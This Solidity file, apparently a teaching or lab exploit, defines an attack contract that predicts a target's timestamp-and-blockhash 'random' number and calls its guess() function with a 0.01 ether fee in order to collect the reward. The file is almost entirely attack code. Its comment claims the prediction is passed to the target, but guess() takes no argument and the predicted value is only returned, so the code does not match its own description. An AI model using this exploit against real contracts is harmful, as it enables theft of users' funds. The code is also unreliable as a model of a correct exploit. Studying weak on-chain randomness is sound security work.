// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IRandomVuln {
    function guess() external payable returns (bool);
}

contract RandomAttack {
    IRandomVuln public target;

    constructor(address _target) {
        target = IRandomVuln(_target);
    }

    /// @notice Attack the vulnerable contract's random logic
    /// The vulnerable contract does:
    ///   random = uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % 10;
    /// Because all inputs are predictable, we can compute the same value here.
    function attack() external payable returns (bool success, uint256 predicted) {
        require(msg.value == 0.01 ether, "Need 0.01 ether guess fee");

        // Predict the random number using the same flawed logic
        uint256 predictedNumber = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    blockhash(block.number - 1)
                )
            )
        ) % 10;

        // Call the target with the exact prediction
        (bool ok,) = address(target).call{value: msg.value}(
            abi.encodeWithSignature("guess()")
        );

        return (ok, predictedNumber);
    }

    // Allow receiving ETH if attack succeeds and target pays reward
    receive() external payable {}
}